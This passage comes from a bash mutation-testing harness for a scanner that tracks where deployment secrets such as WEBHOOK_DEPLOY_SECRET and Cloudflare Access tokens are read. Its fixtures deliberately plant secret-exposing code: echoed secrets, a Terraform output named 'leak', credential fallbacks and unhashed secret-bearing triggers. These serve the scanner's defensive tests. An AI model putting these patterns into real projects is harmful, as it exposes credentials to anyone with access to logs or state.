    run_full "$d/fx" "${BLPATH:-$d/fx/$BASELINE_REL}" "$d/out"
    printf '%s' "$?" > "$d/rc"
  )
}

# The queue: a mutant/green registers its scan, which runs in the background (at most PAR at once); flush_pending judges
# every registered row in registration order. MUT_SYNC=1 (the negative controls) runs and judges immediately.
PAR=4
if command -v nproc >/dev/null 2>&1; then _np="$(nproc 2>/dev/null || echo 2)"; [ "$_np" -lt "$PAR" ] && PAR="$_np"; fi
[ "$PAR" -ge 1 ] || PAR=1
MUT_SYNC=0
Q="$T/pending.q"; : > "$Q"
NOMINAL_WANTS=""
_us=$'\037'
_q() { local IFS="$_us"; printf '%s\n' "$*" >> "$Q"; }
_launch() { # <dir>
  if [ "$MUT_SYNC" = 1 ]; then run_in "$1"; return; fi
  if [ "$(jobs -rp | wc -l)" -ge "$PAR" ]; then wait; fi
  run_in "$1" &
}
# judge_mutant <id> <d> <row> <desc> [want] [arm]
#   Kill rule (one mechanism): scanner rc 0 AND every row present AND the named row FAIL AND its detail carries the named
#   reason. A crash, a short row set or an absent named row is UNRESOLVED (FAIL), never a kill. `want` is matched against the
#   DETAIL only, and a `want` that is a substring of the row's own label is refused (it would be satisfied by any red).
judge_mutant() {
  local id="$1" d="$2" row="$3" desc="$4" want="${5:-}" arm="${6:-}" rc n st detail lbl
  if [ "$(cat "$d/landed" 2>/dev/null)" = "landed" ]; then pass "$id lands: $desc"; else fail "$id lands: $desc" "the edit did not change the pristine copy"; return; fi
  rc="$(cat "$d/rc" 2>/dev/null)"; n="$(nrows "$d/out" 2>/dev/null || echo 0)"
  if [ "${rc:-x}" != "0" ] || [ "$n" -ne "$NROWS" ]; then
    fail "$id: $row is RED" "UNRESOLVED (a crash is not a kill): scanner rc=${rc:-none} rows=$n/$NROWS: $(head -c 200 "$d/out.err" 2>/dev/null)"; return
  fi
  st="$(row_state "$d/out" "$row")"; detail="$(row_detail "$d/out" "$row")"; lbl="$(row_label "$T/ctl.tsv" "$row")"
  if [ "$st" = "MISSING" ]; then fail "$id: $row is RED" "the named row $row is absent from a complete row set (a harness bug)"; return; fi
  if [ "$st" != "FAIL" ]; then fail "$id: $row is RED" "state=$st; $(head -c 200 "$d/out")"; return; fi
  if [ -n "$want" ]; then
    if [ "${lbl#*"$want"}" != "$lbl" ]; then NOMINAL_WANTS="$NOMINAL_WANTS $id"; fail "$id: $row is RED" "nominal attribution: want '$want' is a substring of the row's own label, so any red satisfies it"; return; fi
    if [ "${detail#*"$want"}" = "$detail" ]; then fail "$id: $row is RED" "red, but not for the named reason: wanted '$want' in the detail: ${detail:0:300}"; return; fi
  fi
  if [ -n "$arm" ] && [ "$(cat "$d/out.bd/arm" 2>/dev/null)" != "$arm" ]; then fail "$id: $row is RED" "red, but TRIO_BASE_ARM=$(cat "$d/out.bd/arm" 2>/dev/null), wanted $arm"; return; fi
  pass "$id: $row is RED${want:+ ($want)}"
}
# judge_green <id> <d> <desc> [want] [arm] [ann]
judge_green() {
  local id="$1" d="$2" desc="$3" want="${4:-}" arm="${5:-}" ann="${6:-}" rc
  if [ "$(cat "$d/landed" 2>/dev/null)" != "landed" ]; then fail "$id: $desc" "the edit did not change the pristine copy"; return; fi
  rc="$(cat "$d/rc" 2>/dev/null)"
  if [ "${rc:-x}" != "0" ] || [ "$(nrows "$d/out" 2>/dev/null || echo 0)" -ne "$NROWS" ] || ! all_ok "$d/out"; then fail "$id: $desc" "rc=${rc:-none} $(grep -v '^ok' "$d/out" 2>/dev/null | head -c 400)"; return; fi
  if [ -n "$want" ] && ! has_text "$d/out" "$want"; then fail "$id: $desc" "green, but '$want' is not in the output: $(head -c 300 "$d/out")"; return; fi
  if [ -n "$arm" ] && [ "$(cat "$d/out.bd/arm" 2>/dev/null)" != "$arm" ]; then fail "$id: $desc" "TRIO_BASE_ARM=$(cat "$d/out.bd/arm" 2>/dev/null), wanted $arm"; return; fi
  if [ -n "$ann" ] && ! grep -qF -- "$ann" "$d/out.ann" 2>/dev/null; then fail "$id: $desc" "green, but the annotation '$ann' is not in: $(head -c 300 "$d/out.ann" 2>/dev/null)"; return; fi
  pass "$id: $desc"
}
# CM_ANCHORS: "file|name|class" probe-table rows no scanner-branch mutant may move. A mutated scanner that lost them (or crashed) did not
# measure anything, so it is UNRESOLVED, never a kill.
CM_ANCHORS="scripts/n2.sh|WEBHOOK_DEPLOY_SECRET|sink scripts/tn1.sh|WEBHOOK_DEPLOY_SECRET|sink apps/web-platform/infra/a4.tf|ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID|tier-a .github/actions/c3/helper.sh|CF_ACCESS_CLIENT_ID|sink"
# judge_cmut <id> <desc> <file> <name> <control-class> <rows file> <new class>  — a scanner-branch mutant. Kill rule: the edit LANDED, the edited
# scanner exited 0 without a traceback, every anchor row is intact, and the named case flipped from the control class to the NAMED new class.
judge_cmut() {
  local id="$1" desc="$2" f="$3" n="$4" ctl="$5" rows="$6" want="$7" got rc a af an ac miss=""
  if [ -f "$T/cm/$id.landed" ]; then pass "$id lands: $desc"; else fail "$id lands: $desc" "the edit did not apply exactly once to the scanner copy"; return; fi
  rc="$(cat "$rows.rc" 2>/dev/null)"
  if [ "${rc:-x}" != "0" ] || grep -q 'Traceback' "$rows.err" 2>/dev/null; then
    fail "$id: the case $f $n flips from $ctl to $want" "UNRESOLVED (a crash is not a kill): scanner rc=${rc:-none}: $(head -c 200 "$rows.err" 2>/dev/null)"; return
  fi
  for a in $CM_ANCHORS; do
    IFS='|' read -r af an ac <<< "$a"
    [ "$(pr_class "$rows" "$af" "$an")" = "$ac" ] || miss="$miss $af"
  done
  if [ -n "$miss" ]; then fail "$id: the case $f $n flips from $ctl to $want" "UNRESOLVED (a short or altered row set is not a kill): anchor rows missing:$miss"; return; fi
  got="$(pr_class "$rows" "$f" "$n")"
  if [ "$got" = "$ctl" ]; then fail "$id: the case $f $n flips from $ctl to $want" "unchanged under the mutated scanner: $got"; return; fi
  if [ "$got" != "$want" ]; then fail "$id: the case $f $n flips from $ctl to $want" "flipped to $got, but the edit was declared to produce $want"; return; fi
  pass "$id: the case $f $n flips from $ctl to $got"
}
# mutant <id> <row> <desc> [substr] [arm]
mutant() {
  local id="$1" row="$2" desc="$3" want="${4:-}" arm="${5:-}"
  MUTANTS_RUN=$((MUTANTS_RUN + 1))
  if [ "$MUT_SYNC" = 1 ]; then
    if [ "$(cat "$D/landed" 2>/dev/null)" = "landed" ]; then _launch "$D"; fi
    judge_mutant "$id" "$D" "$row" "$desc" "$want" "$arm"; return
  fi
  if [ "$(cat "$D/landed" 2>/dev/null)" = "landed" ]; then _launch "$D"; fi
  _q mutant "$id" "$D" "$row" "$desc" "$want" "$arm"
}
# green <id> <desc> [substr] [arm] [annotation]  — a must-stay-green fixture: every row ok, all rows present
green() {
  local id="$1" desc="$2" want="${3:-}" arm="${4:-}" ann="${5:-}"
  if [ "$MUT_SYNC" = 1 ]; then
    if [ "$(cat "$D/landed" 2>/dev/null)" = "landed" ]; then _launch "$D"; fi
    judge_green "$id" "$D" "$desc" "$want" "$arm" "$ann"; return
  fi
  if [ "$(cat "$D/landed" 2>/dev/null)" = "landed" ]; then _launch "$D"; fi
  _q green "$id" "$D" "$desc" "$want" "$arm" "$ann"
}
flush_pending() {
  local kind a1 a2 a3 a4 a5 a6 a7
  wait
  while IFS="$_us" read -r kind a1 a2 a3 a4 a5 a6 a7 <&3; do
    case "$kind" in
      mutant) judge_mutant "$a1" "$a2" "$a3" "$a4" "$a5" "$a6" ;;
      green)  judge_green "$a1" "$a2" "$a3" "$a4" "$a5" "$a6" ;;
      cmut)   judge_cmut "$a1" "$a2" "$a3" "$a4" "$a5" "$a6" "$a7" ;;
      cons)   judge_cons "$a1" "$a2" "$a3" "$a4" ;;
    esac
  done 3< "$Q"
  : > "$Q"
}

# ── the probe table (classification cases): small git repos, scanner in --mode emit ───────────────
PT=""
pr_new() { # <name>
  PT="$T/probe/$1"
  assert_fixture_dir "$PT"
  rm -rf "$PT"; mkdir -p "$PT" && GITQ_ISO=1 GITQ init -q -b p "$PT" || { printf 'FAIL SETUP: probe repo %s\n' "$1" >&2; exit 1; }
}
pr_commit() { gc -C "$PT" add -A && gc -C "$PT" commit -q -m probe; }
# pr_emit <probe name> <py> <rows out>  — the classes the scanner computes for the probe repo ("file<TAB>name<TAB>class")
pr_emit() {
  assert_fixture_dir "$T/probe/$1"
  rm -f "$3" "$3.rc"
  GITQ_ISO=1 py3 "$2" --repo "$T/probe/$1" --baseline "$T/empty.tsv" --today "$FIXTODAY" --mode emit --envs "$FIXENVS" --git-iso > "$3.raw" 2> "$3.err"
  printf '%s' "$?" > "$3.rc"
  awk -F'\t' 'NF == 5 && $1 !~ /^@/ {print $1 "\t" $2 "\t" $3}' "$3.raw" | LC_ALL=C sort > "$3"
}
pr_class() { # <rows> <file> <name>
  awk -F'\t' -v f="$2" -v n="$3" '$1 == f && $2 == n {print $3; found = 1; exit} END {if (!found) print "ABSENT"}' "$1"
}
pr_expect() { # <rows> <label> <file> <name> <want class|ABSENT>
  local got
  got="$(pr_class "$1" "$3" "$4")"
  if [ "$got" = "$5" ]; then pass "$2"; else fail "$2" "$3 $4: computed $got, expected $5"; fi
}
# cmut <id> <desc> <old> <new> <file> <name> <control class> <new class>  — run the probe repo $CMPROBE under an edited COPY of the scanner
CMPROBE=""
cmut() {
  local id="$1" desc="$2" old="$3" new="$4" f="$5" n="$6" ctl="$7" newc="$8"
  MUTANTS_RUN=$((MUTANTS_RUN + 1))
  cp "$T/trio.py" "$T/cm/$id.py"
  rm -f "$T/cm/$id.landed" "$T/cm/$id.rows" "$T/cm/$id.rows.rc"
  if edit "$T/cm/$id.py" "$old" "$new"; then : > "$T/cm/$id.landed"; fi
  if [ -f "$T/cm/$id.landed" ]; then
    if [ "$MUT_SYNC" = 1 ]; then pr_emit "$CMPROBE" "$T/cm/$id.py" "$T/cm/$id.rows"
    else
      if [ "$(jobs -rp | wc -l)" -ge "$PAR" ]; then wait; fi
      pr_emit "$CMPROBE" "$T/cm/$id.py" "$T/cm/$id.rows" &
    fi
  fi
  if [ "$MUT_SYNC" = 1 ]; then judge_cmut "$id" "$desc" "$f" "$n" "$ctl" "$T/cm/$id.rows" "$newc"; return; fi
  _q cmut "$id" "$desc" "$f" "$n" "$ctl" "$T/cm/$id.rows" "$newc"
}

NEWYML=$'name: new\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: echo "$WEBHOOK_DEPLOY_SECRET"\n'
ST_PIN_STEMS='STEMS = ["WEBHOOK_DEPLOY_SECRET", "CF_ACCESS_CLIENT_ID", "CF_ACCESS_CLIENT_SECRET"]'
ST_PIN_STEMS_DROP='STEMS = ["WEBHOOK_DEPLOY_SECRET", "CF_ACCESS_CLIENT_ID"]'
HDR_STEMS='@stems WEBHOOK_DEPLOY_SECRET,CF_ACCESS_CLIENT_ID,CF_ACCESS_CLIENT_SECRET'
HDR_STEMS_DROP='@stems WEBHOOK_DEPLOY_SECRET,CF_ACCESS_CLIENT_ID'

# ── M. the original matrix (M1-M13), now on a git fixture ───────────────────────────────────
prep m1
printf 'name: new\njobs:\n  j:\n    runs-on: x\n    env:\n      S: ${{ secrets.WEBHOOK_DEPLOY_SECRET }}\n' > "$D/fx/.github/workflows/new.yml"
landed_dir; mutant m1 T1 "a new consumer with no baseline row" ".github/workflows/new.yml WEBHOOK_DEPLOY_SECRET"

# M2 — a new key whose row IS in the baseline but has no @allow at the base (real merge-base arm)
prep m2
printf '  more: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}\n' >> "$D/fx/.github/workflows/canary-status.yml"
bl_add .github/workflows/canary-status.yml CF_ACCESS_CLIENT_SECRET tier-a 2026-11-30 '#9294:PR-3'
commit_all; landed_dir; mutant m2 T4 "a baseline row (and its read) with no @allow at the merge-base copy" "has no @allow at the merge-base" merge-base

# M3 — a stale row: the consumer no longer reads the name
prep m3
bl_add scripts/gone.sh WEBHOOK_DEPLOY_SECRET tier-a 2026-11-30 '#9294:PR-2'
landed_dir; mutant m3 T2 "a baseline row whose consumer no longer reads the name" "scripts/gone.sh WEBHOOK_DEPLOY_SECRET"

# M4 — a past expiry on a blocking event that touches a row's file
prep m4
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
knobs RF_TODAY=2027-01-01
landed_dir; mutant m4 T3 "every tier-a row past its expiry on a PR that touches a row's file"

# M5 — the narrow carrier must not drag the host-destroy credential in
prep m5
printf 'env2:\n  H: ${{ secrets.HCLOUD_TOKEN }}\n' >> "$D/fx/.github/workflows/web-platform-release.yml"
landed_dir; mutant m5 T7 "HCLOUD_TOKEN named in an already-baselined PR-3 file"
prep m5b
printf 'export H="$HCLOUD_TOKEN"\n' >> "$D/fx/scripts/followthroughs/soak.sh"
landed_dir; mutant m5b T7 "HCLOUD_TOKEN named in an already-baselined PR-4 file"
prep m5c
printf 'env2:\n  H: ${{ secrets.HCLOUD_TOKEN }}\n' >> "$D/fx/.github/workflows/web-platform-release.yml"
bl_set .github/workflows/web-platform-release.yml WEBHOOK_DEPLOY_SECRET 5 '#9294:PR-2'
landed_dir; mutant m5c T7 "HCLOUD_TOKEN in a PR-3 file whose baseline tag was edited to PR-2 (T7 keys on the computed group)"
prep m5d
printf 'env2:\n  H: ${{ secrets.hcloud_token }}\n' >> "$D/fx/.github/workflows/web-platform-release.yml"
landed_dir; mutant m5d T7 "a lower-case hcloud_token in a PR-3 file (the name match is case-insensitive)"

# M6 — the scan walks nothing (the empty file set: every scanned file is gone from the worktree)
prep m6
rm -rf "$D/fx/.github" "$D/fx/scripts" "$D/fx/apps" "$D/fx/plugins" "$D/fx/tests" "$D/fx/$KBN" "$D/fx/docs"
landed_dir; mutant m6 T0 "an empty scan set"

# M7 — a file that already has one compliant baselined read gains a second trio name
prep m7
printf '  more: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}\n' >> "$D/fx/.github/workflows/web-platform-release.yml"
landed_dir; mutant m7 T1 "a second trio name added to a baselined file (keyed by (file, name), not file)" "web-platform-release.yml CF_ACCESS_CLIENT_SECRET"

# M8 — a silent fallback to another credential on a logical line that reads a trio name
prep m8
printf 'x="$(doppler secrets get CF_ACCESS_CLIENT_ID --plain || doppler secrets get CI_SSH_ACCESS_TOKEN_SECRET --plain)"\n' >> "$D/fx/scripts/probe.sh"
landed_dir; mutant m8 T1 "a fallback pair with no baseline row" "FALLBACK:CI_SSH_ACCESS_TOKEN_SECRET"

# M9 — a triggers_replace that carries the rendered hooks.json unhashed
prep m9
edit "$D/fx/apps/web-platform/infra/server.tf" 'triggers_replace = sha256(join(",", [file("${path.module}/a.sh"), local.hooks_json]))' 'triggers_replace = join(",", [file("${path.module}/a.sh"), local.hooks_json])'
landed_dir; mutant m9 H1 "triggers_replace not wrapped in sha256("

# M10 — an output block that exposes the webhook secret
prep m10
printf 'output "leak" {\n  value = var.webhook_deploy_secret\n}\n' >> "$D/fx/apps/web-platform/infra/server.tf"
landed_dir; mutant m10 H2 "an output that references the webhook secret"

# M11 — a terraform_data input that stores the rendered hooks.json
prep m11
printf 'resource "terraform_data" "bad" {\n  input = local.hooks_json\n}\n' >> "$D/fx/apps/web-platform/infra/server.tf"
landed_dir; mutant m11 H3 "a terraform_data input that references the rendered hooks.json"

# M12 — a duplicate baseline row
prep m12
bl_add .github/workflows/web-platform-release.yml WEBHOOK_DEPLOY_SECRET tier-a 2026-11-30 '#9294:PR-3'
landed_dir; mutant m12 T5 "a duplicate (file, name) baseline row" "duplicate .github/workflows/web-platform-release.yml"

# M13 — an issue tag outside the four groups, and a tag inside them that is not the computed group
prep m13
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 5 '#9294:PR-9'
landed_dir; mutant m13 T5 "a baseline row tagged outside PR-1..PR-4" "PR-9"
prep m13b
bl_set scripts/probe.sh CF_ACCESS_CLIENT_ID 5 '#9294:PR-4'
landed_dir; mutant m13b T5 "a tag inside PR-1..PR-4 that is not the group computed from the path" "is not the computed group #9294:PR-2 of scripts/probe.sh"

# ── R1-R4 (F-A2): the structural test class replaces the name-based exemption ─────────────────────
prep m14
printf '%s' "$NEWYML" > "$D/fx/.github/workflows/test-x.yml"
landed_dir; mutant m14 T1 "R1: a test-named workflow naming the trio (nothing under .github/ is exempt)" ".github/workflows/test-x.yml"
prep m14b
mkdir -p "$D/fx/.github/scripts/tests"; printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$D/fx/.github/scripts/tests/foo.test.sh"
landed_dir; mutant m14b T1 "R1: .github/scripts/tests/foo.test.sh (a tests/ directory AND a .test. suffix) is still scanned: nothing under .github/ is exempt" ".github/scripts/tests/foo.test.sh"
prep m15
mkdir -p "$D/fx/scripts/lib"; printf '#!/usr/bin/env bash\necho "$CF_ACCESS_CLIENT_ID"\n' > "$D/fx/scripts/lib/test-x.sh"
landed_dir; mutant m15 T1 "R2: scripts/lib/test-x.sh naming the trio (the /test- name is no longer an exemption)" "scripts/lib/test-x.sh"
prep m16
printf '#!/usr/bin/env bash\nS="${{ secrets.WEBHOOK_DEPLOY_SECRET }}"\n' > "$D/fx/scripts/foo.test.sh"
landed_dir; mutant m16 T1 "R3: scripts/foo.test.sh holding a secrets.WEBHOOK_DEPLOY_SECRET read (exempt by shape, still needs a row)" "scripts/foo.test.sh WEBHOOK_DEPLOY_SECRET"
prep m16b
printf '#!/usr/bin/env bash\ndoppler secrets get CF_ACCESS_CLIENT_SECRET --plain\n' > "$D/fx/apps/web-platform/test/z.sh"
landed_dir; mutant m16b T1 "R3: a doppler secrets get read inside a tests directory (second read shape, second exempt class)" "apps/web-platform/test/z.sh CF_ACCESS_CLIENT_SECRET"
prep m17
printf '#!/usr/bin/env bash\necho "$CF_ACCESS_CLIENT_SECRET"\n' > "$D/fx/.github/scripts/new.sh"
landed_dir; mutant m17 T1 "R4: a new .github/scripts/new.sh naming the trio" ".github/scripts/new.sh"
prep m18
mkdir -p "$D/fx/plugins/soleur/skills/z"; printf '#!/usr/bin/env bash\necho "$CF_ACCESS_CLIENT_SECRET"\n' > "$D/fx/plugins/soleur/skills/z/new.sh"
landed_dir; mutant m18 T1 "R4: a new plugins/soleur/skills/z/new.sh naming the trio" "plugins/soleur/skills/z/new.sh"
prep m19
printf 'const s = process.env.CF_ACCESS_CLIENT_SECRET;\n' > "$D/fx/apps/web-platform/server/new.ts"
landed_dir; mutant m19 T1 "R4: a new apps/web-platform/server/new.ts naming the trio" "apps/web-platform/server/new.ts"
prep m19b
printf 'The CF_ACCESS_CLIENT_ID pair authenticates the tunnel.\n' > "$D/fx/plugins/soleur/skills/ship/NOTES.md"
landed_dir; mutant m19b T1 "R4: a .md outside the knowledge base and docs that merely names the trio is scanned" "plugins/soleur/skills/ship/NOTES.md"

# ── R5 (F-A3): the token family ───────────────────────────────────────────────────────────────────
prep m20
printf '#!/usr/bin/env bash\nexport TF_VAR_WEBHOOK_DEPLOY_SECRET="$X"\n' > "$D/fx/scripts/v1.sh"
landed_dir; mutant m20 T1 "R5: TF_VAR_WEBHOOK_DEPLOY_SECRET is the trio (row name WEBHOOK_DEPLOY_SECRET)" "scripts/v1.sh WEBHOOK_DEPLOY_SECRET"
prep m21
printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET_OLD"\n' > "$D/fx/scripts/v2.sh"
landed_dir; mutant m21 T1 "R5: WEBHOOK_DEPLOY_SECRET_OLD is its own key" "scripts/v2.sh WEBHOOK_DEPLOY_SECRET_OLD"
prep m22
printf 'variable "webhook_deploy_secret_prev" {}\n' > "$D/fx/apps/web-platform/infra/prev.tf"
landed_dir; mutant m22 T1 "R5: lower-case webhook_deploy_secret_prev merges into the upper-case family key" "prev.tf WEBHOOK_DEPLOY_SECRET_PREV"
prep m22b
printf '#!/usr/bin/env bash\nexport TF_VAR_cf_access_client_id="$X"\n' > "$D/fx/scripts/v3.sh"
landed_dir; mutant m22b T1 "R5: TF_VAR_cf_access_client_id is CF_ACCESS_CLIENT_ID" "scripts/v3.sh CF_ACCESS_CLIENT_ID"
prep m22c
printf '#!/usr/bin/env bash\necho "$WEBHOOK_\\\nDEPLOY_SECRET"\n' > "$D/fx/scripts/v4.sh"
landed_dir; mutant m22c T1 "R5: a name split by a backslash continuation (bash reads it as one token)" "scripts/v4.sh WEBHOOK_DEPLOY_SECRET"

# ── R6: the Access token under its Terraform spellings (ALIAS), DEPLOY token only ─────────────────
prep m23
printf '#!/usr/bin/env bash\nX="$(terraform output -raw access_service_token_client_secret)"\n' > "$D/fx/scripts/tf-out.sh"
landed_dir; mutant m23 T1 "R6: terraform output -raw access_service_token_client_secret in a new script (ALIAS)" "scripts/tf-out.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET"
prep m23b
printf 'locals { i = cloudflare_zero_trust_access_service_token.deploy.client_id }\n' > "$D/fx/apps/web-platform/infra/other.tf"
landed_dir; mutant m23b T1 "R6: the cloudflare_zero_trust_access_service_token.deploy.client_id attribute in a new .tf (ALIAS)" "other.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID"
prep m23c
printf 'variable "x" {}\n# TF_VAR_access_service_token_client_id\nlocals { v = var.TF_VAR_access_service_token_client_id }\n' > "$D/fx/apps/web-platform/infra/other2.tf"
landed_dir; mutant m23c T1 "R6: the TF_VAR_ spelling of the deploy Access token output (ALIAS)" "other2.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID"
prep c23
printf '#!/usr/bin/env bash\nA="$(terraform output -raw ci_ssh_access_service_token_client_id)"\nB="$CI_SSH_ACCESS_SERVICE_TOKEN_CLIENT_SECRET"\n' > "$D/fx/scripts/ci-ssh.sh"
printf 'locals { a = cloudflare_zero_trust_access_service_token.ci_ssh.client_secret\n b = cloudflare_zero_trust_access_service_token.registry_push.client_id\n c = var.registry_push_access_service_token_client_id }\n' > "$D/fx/apps/web-platform/infra/ci-ssh.tf"
landed_dir; green c23 "R6: the ci_ssh and registry_push spellings (G1b, other credentials) stay green in a shell script and in Terraform"

# ── R7-R9 (F-B): tag, expiry, class ───────────────────────────────────────────────────────────────
prep m24
bl_set apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET 5 '#9294:PR-3'
commit_all; landed_dir; mutant m24 T4 "R7: the tag of a sink row changed vs the base copy" "tag of apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET changed"
prep m25
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
commit_all; landed_dir; mutant m25 T4 "R8: a tier-a expiry later than the base copy's with no ADR line" "Re-date"
prep c25
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
adr_add 'Re-date: 2026-12-15 the git-data rehearsal slipped a week. Ruled by CTO'
commit_all; landed_dir; green c25 "R8: the same extension is green with the ADR-241 Re-date line in a baseline/ADR-only diff"
prep m26
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
adr_add 'Re-date: 2026-12-15 the git-data rehearsal slipped a week. Ruled by CTO'
printf '# touched\n' >> "$D/fx/scripts/host-user.sh"
commit_all; landed_dir; mutant m26 T4 "R8: the Re-date line with a code file in the same diff is not a baseline-only change" "Re-date"
prep m26b
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
adr_add 'Re-date: 2026-12-15 the git-data rehearsal slipped a week. Ruled by CTO'
mkdir -p "$D/fx/knowledge-base/project/plans"; printf 'a plan\n' > "$D/fx/knowledge-base/project/plans/some-plan.md"
commit_all; landed_dir; mutant m26b T4 "D6: the Re-date lane's allowed subset is {baseline, ADR-241}: a plan document in the same diff is not baseline-only" "Re-date"
prep m27
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
adr_add 'Re-date: 2026-12-16 the git-data rehearsal slipped a week. Ruled by CTO'
commit_all; landed_dir; mutant m27 T4 "R8: a Re-date line whose date is not the new expiry" "Re-date"
prep m27b
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
adr_add 'Re-date: 2026-12-15 the git-data rehearsal slipped a week, no owner named.'
commit_all; landed_dir; mutant m27b T4 "E5: a Re-date line without a 'Ruled by <owner>' is not a ruling" "Re-date"
prep c25b
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
bl_set .github/workflows/cutover-inngest.yml CF_ACCESS_CLIENT_SECRET 4 2026-12-20
adr_add 'Re-date: 2026-12-15 the rehearsal slipped a week. Ruled by CTO'
adr_add 'Re-date: 2026-12-20 the wipe slipped a week. Ruled by CTO'
commit_all; landed_dir; green c25b "E5: two extended rows, each date ruled in the ADR, are green"
prep m25b
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-12-15
bl_set .github/workflows/cutover-inngest.yml CF_ACCESS_CLIENT_SECRET 4 2026-12-20
adr_add 'Re-date: 2026-12-15 the rehearsal slipped a week. Ruled by CTO'
commit_all; landed_dir; mutant m25b T4 "E5: two extended rows with only one date ruled (every extended row needs its ruling, not any)" "Re-date"
prep c27c
bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2026-11-15
commit_all; landed_dir; green c27c "E5: a SHORTENED expiry needs no ruling"
prep m28
bl_set .github/workflows/deploy-chan.yml WEBHOOK_DEPLOY_SECRET 3 tier-a
bl_set .github/workflows/deploy-chan.yml WEBHOOK_DEPLOY_SECRET 4 2026-11-30
commit_all; landed_dir; mutant m28 T4 "R9: class tier-b -> tier-a moves backwards" "moved backwards or sideways"
prep m28s
bl_set .github/workflows/deploy-chan.yml WEBHOOK_DEPLOY_SECRET 3 sink
commit_all; landed_dir; mutant m28s T4 "E5: class tier-b -> sink is sideways, not forward" "moved backwards or sideways"
prep m29
bl_set .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID 3 tier-b
bl_set .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID 4 -
landed_dir; mutant m29 T5c "R9: tier-a -> tier-b with no environment in the job fails the class recompute" ".github/workflows/migrate.yml CF_ACCESS_CLIENT_ID (baseline tier-b, computed tier-a)"
prep c29
printf 'name: migrate\njobs:\n  m:\n    runs-on: ubuntu-latest\n    environment: deploy-channel\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n' > "$D/fx/.github/workflows/migrate.yml"
bl_set .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID 3 tier-b
bl_set .github/workflows/migrate.yml CF_ACCESS_CLIENT_ID 4 -
commit_all; landed_dir; green c29 "R9: a migration PR (read shape -> loader env on a Tier-B environment, tier-a -> tier-b) is green"
prep m28b
printf 'doppler run -p soleur -c prd_terraform -- true\n' >> "$D/fx/scripts/host-user.sh"
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 3 tier-a
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 4 2026-11-30
commit_all; landed_dir; mutant m28b T4 "N1: class sink -> tier-a (an unrelated doppler call appended to a sink file) with no Reclass line is RED, and the message names the lane" "needs an ADR-241 line 'Reclass:"
prep c28g
printf 'doppler run -p other -c prd -- true\n' >> "$D/fx/scripts/host-user.sh"
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 3 tier-a
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 4 2026-11-30
adr_add 'Reclass: scripts/host-user.sh WEBHOOK_DEPLOY_SECRET an unrelated doppler call joined a sink file. Ruled by CTO'
commit_all; landed_dir; green c28g "N1: the same sink -> tier-a move with its ADR-241 Reclass line, in a diff of the baseline, the ADR and the moved key's own file, is green"
prep c28h
printf 'doppler run -p other -c prd -- true\n' >> "$D/fx/scripts/host-user.sh"
printf 'doppler secrets get OTHER --plain\n' >> "$D/fx/apps/web-platform/infra/variables.tf"
for _rk in scripts/host-user.sh apps/web-platform/infra/variables.tf; do bl_set "$_rk" WEBHOOK_DEPLOY_SECRET 3 tier-a; bl_set "$_rk" WEBHOOK_DEPLOY_SECRET 4 2026-11-30; done
adr_add 'Reclass: scripts/host-user.sh WEBHOOK_DEPLOY_SECRET an unrelated doppler call joined a sink file. Ruled by CTO'
adr_add 'Reclass: apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET a doppler call joined a sink file. Ruled by CTO'
commit_all; landed_dir; green c28h "N1: two moved keys, each ruled in the ADR, are green"
prep m28g
printf 'doppler run -p other -c prd -- true\n' >> "$D/fx/scripts/host-user.sh"
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 3 tier-a
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 4 2026-11-30
adr_add 'Reclass: scripts/host-user.sh WEBHOOK_DEPLOY_SECRET an unrelated doppler call joined a sink file. Ruled by CTO'
printf 'unrelated\n' > "$D/fx/README.md"
commit_all; landed_dir; mutant m28g T4 "N1: the Reclass line in a diff that also touches an unrelated file is RED (the lane is the baseline, the ADR and the moved key's own file)" "needs an ADR-241 line 'Reclass:"
prep m28h
printf 'doppler run -p other -c prd -- true\n' >> "$D/fx/scripts/host-user.sh"
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 3 tier-a
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 4 2026-11-30
adr_add 'Reclass: scripts/other.sh WEBHOOK_DEPLOY_SECRET a different file joined the lane. Ruled by CTO'
commit_all; landed_dir; mutant m28h T4 "N1: a Reclass line for a DIFFERENT (file, name) does not authorize the move" "needs an ADR-241 line 'Reclass:"
prep m28i
printf 'doppler run -p other -c prd -- true\n' >> "$D/fx/scripts/host-user.sh"
bl_set scripts/host-user.sh WEBHOOK_DEPLOY_SECRET 3 tier-a
